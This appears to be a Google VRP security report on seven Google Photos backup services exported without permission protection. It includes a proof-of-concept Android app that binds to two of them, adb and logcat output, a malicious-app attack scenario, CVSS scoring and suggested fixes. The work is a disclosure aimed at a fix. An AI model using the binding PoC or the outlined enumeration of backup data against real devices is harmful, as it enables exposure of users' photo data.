# Google VRP Report: Google Photos Backup Services Exposed Without Permission Protection

## Summary

Seven backup-related services in Google Photos (com.google.android.apps.photos) are declared as `android:exported="true"` with no `android:permission` attribute, allowing any installed application to bind to them and establish a cross-process IPC channel. A PoC application demonstrates successful binding to `PhotosBackupGrpcService` and `PhotosBackupApiService` — both accepted the connection and returned IBinder objects. This is inconsistent with internal backup services in the same app (e.g., `AutobackupJobService`) that are correctly configured as `exported=false` with `permission=BIND_JOB_SERVICE`.

## Affected Components

| Service | Exported | Permission | Issue |
|---|---|---|---|
| `PhotosBackupGrpcService` | true | **NONE** | gRPC backup service — **bound by PoC** |
| `PhotosSmuiBackupGrpcService` | true | **NONE** | SMUI backup gRPC service |
| `PhotosBackupApiService` | true | **NONE** | Backup API — **bound by PoC** |
| `PhotosCustomBackupApiService` | true | **NONE** | Custom backup API |
| `PhotosSdkBackupApiService` | true | **NONE** | SDK backup API |
| `BackupExtensionsApiService` | true | **NONE** | Backup extensions API |
| `HybridRestoreApiService` | true | **NONE** | Hybrid restore API |

**Compare with correctly secured internal backup services:**

| Service | Exported | Permission |
|---|---|---|
| `AutobackupJobService` | false | BIND_JOB_SERVICE |
| `BackupRetryJobService` | false | BIND_JOB_SERVICE |
| `UserInitiatedBackupJobService` | false | BIND_JOB_SERVICE |
| `UriTriggeredBackupJob` | false | BIND_JOB_SERVICE |

## Device Information

- Device: Pixel 6a (bluejay)
- Android Version: 17 (CP31.260608.007)
- Security Patch: 2026-06-05
- Google Photos version: as installed at time of testing

## Vulnerability Details

The seven backup services are exported with no permission check in the AndroidManifest.xml. When a third-party app calls `bindService()` targeting these components:

1. Android framework checks for permissions — finds none required
2. The service is started and `onBind()` is called
3. The calling app receives an `IBinder` via `onServiceConnected()`
4. A cross-process IPC channel is established

The PoC app (UID 10346, package `com.vrppoc`) successfully bound to both `PhotosBackupGrpcService` and `PhotosBackupApiService`:

```
[BOUND] PhotosBackupGrpcService connected!
    Service: com.google.android.apps.photos/.backup.apiservice.grpc.PhotosBackupGrpcService
    IBinder: android.os.BinderProxy

[BOUND] PhotosBackupApiService connected!
    Service: com.google.android.apps.photos/.backup.apiservice.PhotosBackupApiService
```

These services handle backup operations for user photos — potentially exposing:
- Photo metadata, file lists, and backup state
- Backup configuration and account information
- Restore capabilities (HybridRestoreApiService)

## Reproduction Steps

### Step 1: Create PoC Application

**AndroidManifest.xml:**
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrppoc">
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <queries>
        <package android:name="com.google.android.apps.photos" />
    </queries>
    <application android:label="VRP PoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**MainActivity.java — bind to Photos backup services:**
```java
Intent grpcIntent = new Intent();
grpcIntent.setComponent(new ComponentName(
    "com.google.android.apps.photos",
    "com.google.android.apps.photos.backup.apiservice.grpc.PhotosBackupGrpcService"
));

boolean bound = bindService(grpcIntent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // SUCCESS - bound to Photos backup gRPC service!
        // IBinder received - can make IPC calls
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {}
}, Context.BIND_AUTO_CREATE);
// bound == true — service accepted the connection
```

### Step 2: Install and Run

```
$ adb install vrppoc.apk
Success
$ adb shell am start -n com.vrppoc/.MainActivity
```

### Step 3: Verify binding in logcat

```
$ adb logcat -s VRP_POC
[BOUND] PhotosBackupGrpcService connected!
    Service: com.google.android.apps.photos/.backup.apiservice.grpc.PhotosBackupGrpcService
    IBinder: android.os.BinderProxy
    Impact: Third-party app bound to Photos backup service
[BOUND] PhotosBackupApiService connected!
    Service: com.google.android.apps.photos/.backup.apiservice.PhotosBackupApiService
    Impact: Third-party app bound to Photos backup API
```

## Impact Assessment

- **Confidentiality**: A malicious app can bind to backup services that handle user photos — the IPC channel could expose photo metadata, backup state, file listings, or backup configuration
- **Integrity**: The `HybridRestoreApiService` and `PhotosCustomBackupApiService` handle restore/custom backup operations — a malicious app could potentially manipulate backup/restore flows
- **Availability**: Repeated binding/unbinding could disrupt ongoing backup operations

### Attack Scenario

1. User installs a malicious app
2. App binds to `PhotosBackupGrpcService` using the gRPC protocol
3. App enumerates available gRPC methods via reflection or known proto definitions
4. App reads backup metadata, photo file lists, or triggers backup/restore operations
5. User's photo data or backup state is compromised

## Root Cause

The seven backup API services are declared with `android:exported="true"` but lack an `android:permission` attribute. They appear to be designed for GMS (Google Mobile Services) backup framework integration but are accessible to any app. The correct fix is to restrict them with `android:permission="com.google.android.gms.permission.BIND_BACKUP_AGENT"` or similar, or set `android:exported="false"` if they don't need to be called from outside the Photos app process.

## Suggested Fix

1. Add `android:permission="signature"` or a signature-level permission to all seven services
2. Alternatively, set `android:exported="false"` if the services are only needed within the Photos app
3. If the services must be callable by GMS, use a signature-level permission shared between Photos and GMS

## CVSS Assessment

- Attack Vector: Local (installed app)
- Attack Complexity: Low (just bind to the service)
- Privileges Required: None (no permission needed)
- User Interaction: None
- Scope: Unchanged
- Confidentiality: Medium (potential photo backup data exposure)
- Integrity: Low (potential backup state manipulation)
- Availability: Low (backup disruption)

**CVSS 3.1 Score: ~6.1 (Medium)**

## CWE Classification

- **CWE-926**: Improper Export of Android Application Components
- **CWE-862**: Missing Authorization

## Evidence Files

- PoC source: `/Users/sandiyochristan/Documents/vulnerabilityRes/vrp_poc_app/`
- Logcat evidence: `evidence_combined_poc_logcat.txt`
- Screenshot: `evidence_combined_poc_screenshot.png`
